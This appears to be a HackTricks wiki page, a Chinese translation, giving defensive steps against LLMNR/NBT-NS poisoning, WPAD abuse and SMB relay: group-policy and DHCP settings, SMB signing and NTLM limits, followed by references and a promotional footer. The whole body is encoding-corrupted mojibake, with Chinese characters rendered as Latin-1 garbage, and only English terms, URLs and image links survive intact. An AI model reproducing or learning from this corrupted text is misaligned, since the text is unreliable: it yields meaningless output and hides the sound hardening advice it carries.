è¦åœ¨åŸŸä¸­ä¸º DNS å®¢æˆ·ç«¯ç¦ç”¨ LLMNRï¼Œè¯·æ‰“å¼€ gpedit.mscã€‚\
å¯¼èˆªåˆ°è®¡ç®—æœºé…ç½®->ç®¡ç†æ¨¡æ¿->ç½‘ç»œ->DNS å®¢æˆ·ç«¯ã€‚\
æ‰¾åˆ°é€‰é¡¹â€œå…³é—­å¤šæ’­åç§°è§£æâ€å¹¶å•å‡»â€œç­–ç•¥è®¾ç½®â€ï¼š

![](../../.gitbook/assets/1.jpg)

æ–°çª—å£æ‰“å¼€åï¼Œå¯ç”¨æ­¤é€‰é¡¹ï¼Œç‚¹å‡»åº”ç”¨å¹¶ç‚¹å‡»ç¡®å®šï¼š

![](../../.gitbook/assets/2.jpg)

### **ç¦ç”¨ NBT-NS**

ç¦ç”¨ NBT-NS çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ DHCP èŒƒå›´é€‰é¡¹ã€‚

å¦‚æœä½¿ç”¨ Microsoft çš„ DHCP æœåŠ¡å™¨ï¼Œè¯·é€‰æ‹©è¦ç¦ç”¨ NBT-NS çš„èŒƒå›´ã€‚å³é”®å•å‡»â€œèŒƒå›´é€‰é¡¹â€ï¼Œç„¶åå•å‡»â€œé…ç½®é€‰é¡¹â€ã€‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘è¦ç¦ç”¨ NBT-NS çš„ DHCP èŒƒå›´æ˜¯ 192.168.1.100ã€‚

![](../../.gitbook/assets/3.jpg)

åœ¨èŒƒå›´é€‰é¡¹çª—å£ä¸­ï¼Œå¯¼èˆªåˆ°é«˜çº§é€‰é¡¹å¡ï¼Œå°†ä¸‹æ‹‰çª—å£æ›´æ”¹ä¸ºâ€œMicrosoft Windows 2000 é€‰é¡¹â€ï¼š

![](../../.gitbook/assets/4.jpg)

ä»åˆ—è¡¨ä¸­é€‰æ‹©é€‰é¡¹â€œ001 Microsoft Disable Netbios Optionâ€ï¼Œå°†å…¶å€¼æ›´æ”¹ä¸ºâ€œ0x2â€ï¼Œç‚¹å‡»åº”ç”¨ï¼Œç„¶åç‚¹å‡»ç¡®å®šï¼š

![](../../.gitbook/assets/5.jpg)

### WPAD

ä¸ºäº†é˜²æ­¢ WPAD æ”»å‡»ï¼Œæ‚¨å¯ä»¥åœ¨ DNS åŒºåŸŸä¸­æ·»åŠ ä¸€ä¸ªåä¸º "wpad" çš„æ¡ç›®ã€‚è¯·æ³¨æ„ï¼ŒDNS æ¡ç›®ä¸éœ€è¦æŒ‡å‘æœ‰æ•ˆçš„ WPAD æœåŠ¡å™¨ã€‚åªè¦æŸ¥è¯¢å¾—åˆ°è§£æï¼Œæ”»å‡»å°±ä¼šè¢«é˜»æ­¢ã€‚

### å¤šé‡ä¸­ç»§

1\. **å¼ºåˆ¶æ‰€æœ‰æœ¬åœ° Windows æœºå™¨ä¸Šå¯ç”¨ SMB ç­¾å**ã€‚æ­¤è®¾ç½®å°†åœ¨æ¯ä¸ª SMB ä¼šè¯ä¸Šè¿›è¡Œæ•°å­—ç­¾åï¼Œå¼ºåˆ¶å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åœ¨ç»§ç»­ä¹‹å‰éªŒè¯æ•°æ®åŒ…çš„æ¥æºã€‚æ­¤è®¾ç½®ä»…åœ¨åŸŸæ§åˆ¶å™¨ä¸Šé»˜è®¤å¯ç”¨ã€‚ä»¥ä¸‹æ¥è‡ª Microsoft çš„æ–‡ç« è¯¦ç»†ä»‹ç»äº†è¿™äº›è®¾ç½®ï¼ˆå¯ä»¥é€šè¿‡ç»„ç­–ç•¥å¯ç”¨ï¼‰ï¼Œä»¥åŠå¦‚ä½•å®æ–½å®ƒä»¬ã€‚

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **å®¡æŸ¥å¹¶ç¡®ä¿æœ¬åœ°ç½‘ç»œä¸Šçš„ç”¨æˆ·åªèƒ½è¿œç¨‹ç™»å½•åˆ°å¿…è¦çš„æœºå™¨**ã€‚ä¾‹å¦‚ï¼šSally åªèƒ½ç™»å½•åˆ° Sally çš„å·¥ä½œç«™ã€‚å¦‚æœæ”»å‡»è€…æ‹¦æˆªäº† Sally çš„ SMB è®¤è¯ä¼šè¯ï¼Œä»–ä»¬æ— æ³•å°†ä¼šè¯ä¸­ç»§åˆ°ä»»ä½•å·¥ä½œç«™ï¼Œä½¿æ­¤æ–¹æ³•æ— æ•ˆã€‚

3\. **å°½å¯èƒ½é™åˆ¶æœ¬åœ°ç½‘ç»œä¸Šçš„ NTLM è®¤è¯**ã€‚æ­¤æ”»å‡»æ— æ³•åˆ©ç”¨ Kerberos è®¤è¯ï¼Œå› æ­¤é€šè¿‡é™åˆ¶ NTLM çš„ä½¿ç”¨é‡ï¼Œå¯ä»¥å¤§å¤§é˜»ç¢æ­¤æ”»å‡»ã€‚Microsoft æä¾›äº†æœ‰å…³å¦‚ä½•å®ç°æ­¤ç›®æ ‡çš„ä¿¡æ¯ï¼Œä½†è¯·æ³¨æ„...å¦‚æœç”±äºæŸç§åŸå› å¯¼è‡´ Kerberos è®¤è¯å¤±è´¥ï¼Œå®ƒé€šå¸¸ä¼šå›é€€åˆ° NTLMã€‚å¦‚æœå®Œå…¨ç¦ç”¨å®ƒï¼Œæ‚¨çš„ç½‘ç»œå¯èƒ½ä¼šé™·å…¥åœæ»ã€‚

4\. **é˜²æ­¢æœªç»æˆæƒçš„ç”¨æˆ·è¿›å…¥æ‚¨çš„ç½‘ç»œ**ã€‚å†…éƒ¨å¨èƒå¯èƒ½ä¸ä¼šåˆ©ç”¨ SMB ä¸­ç»§æ”»å‡»ï¼Œå› ä¸ºä»–ä»¬å·²ç»æ‹¥æœ‰ç½‘ç»œå‡­æ®ã€‚é€šè¿‡åŠ å¼ºç‰©ç†å®‰å…¨ç­–ç•¥ï¼Œä½¿ç”¨ ACL å’Œ MAC è¿‡æ»¤å™¨é˜²æ­¢ç½‘ç»œä¸Šçš„æ¶æ„è®¾å¤‡ï¼Œå¹¶ç¡®ä¿é€‚å½“çš„ç½‘ç»œåˆ†å‰²ï¼Œå¯ä»¥å¤§å¤§é™åˆ¶æ­¤æ”»å‡»çš„å¨èƒã€‚

## å‚è€ƒèµ„æ–™

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **å›¾ç‰‡æ¥æºï¼š**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨ HackTricks ä¸­**å®£ä¼ æ‚¨çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ä¸Š **å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
